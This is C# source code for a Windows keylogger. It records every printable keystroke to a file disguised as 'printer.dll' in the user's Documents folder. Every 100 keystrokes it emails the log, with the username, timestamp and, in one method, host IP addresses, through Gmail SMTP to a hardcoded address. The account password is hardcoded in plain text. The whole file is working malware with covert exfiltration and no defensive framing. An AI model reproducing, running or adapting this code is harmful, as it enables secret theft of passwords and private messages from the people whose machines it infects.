using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("User32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    static long numberOfKeyStroke = 0;
   static string globalFileName = "printer.dll";

    static void Main(string[] args)
    {
        string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);


        //create the directory ehre to save the file
        if (!Directory.Exists(filepath))
        {

            Directory.CreateDirectory(filepath);
        }

        string path = (filepath + $@"\{globalFileName}");
        if (!File.Exists(path))
        {
            using (StreamWriter sw = File.CreateText(path))
            {

            }
        }


        // capture keystroke and display them to console



        while (true)
        {
        //    pause and let other program get chance to run
            Thread.Sleep(5);

            for (int i = 32; i < 127; i++)
            {
                int keystate = GetAsyncKeyState( i);
                if (keystate != 00 )
                {
                 
                    // store the strokes into a text file
                    using (StreamWriter sw = File.AppendText(path)) {
                        sw.Write((char)i);
                            }
                    numberOfKeyStroke++;

                    if (numberOfKeyStroke % 100 == 0) {

                        SendEmail();
                    }


                }
            }
        }

        

    }

    static void SendMessage()
    {
        // send content of the text file to an external email adress
        string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string filePath = folderName + $@"\{globalFileName}";

        string logContent = File.ReadAllText(filePath);

        string emailBody = "";

        // create an email message

        DateTime now = DateTime.Now;
        string subject = "Mesage from keylogger";

        var host = Dns.GetHostEntry(Dns.GetHostName());
        foreach (var adress in host.AddressList)
        {
            emailBody += "Adress : " + adress;
        }

        emailBody += "\n User : " + Environment.UserDomainName+"\\"+Environment.UserName;
        emailBody += "\n Host : " + host;
        emailBody += "\n time : " + now.ToString();
        emailBody += logContent;

        SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
        MailMessage mailMessage = new MailMessage();
        mailMessage.From = new MailAddress("justtotestpurpose19@gmail.com");
        client.UseDefaultCredentials = true;
        mailMessage.Subject = subject;
        mailMessage.Body = emailBody;
        mailMessage.To.Add("justtotestpurpose19@gmail.com");
       
        client.Credentials = new NetworkCredential("justtotestpurpose19@gmail.com", "123456654321tp");
        client.EnableSsl = true;
        client.Send(mailMessage);

    }

    static void SendEmail() {



        // send content of the text file to an external email adress
        string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string filePath = folderName + $@"\{globalFileName}";

        string logContent = File.ReadAllText(filePath);

        string emailBody = "";

        // create an email message

        DateTime now = DateTime.Now;


        emailBody += "\n User : " + Environment.UserDomainName + "\\" + Environment.UserName;
   
        emailBody += "\n time : " + now.ToString();
        emailBody += logContent;


        SmtpClient client = new SmtpClient();
        client.Host = "smtp.gmail.com";
        client.Port = 587;
        client.EnableSsl = true;

        System.Net.NetworkCredential userpassword = new System.Net.NetworkCredential();
        userpassword.UserName = "justtotestpurpose19@gmail.com";
        userpassword.Password = "123456654321tp";

        client.Credentials = userpassword;

        MailMessage msg = new MailMessage("justtotestpurpose19@gmail.com", "justtotestpurpose19@gmail.com");
      msg.To.Add(new MailAddress("justtotestpurpose19@gmail.com"));
        msg.Body = emailBody;
        msg.Subject = "from keylogger";
        msg.IsBodyHtml = true;

        try
        {
            client.Send(msg);
        }
        catch (Exception e)
        {

            Console.WriteLine(e.Message);
        }
           
        



    }


}

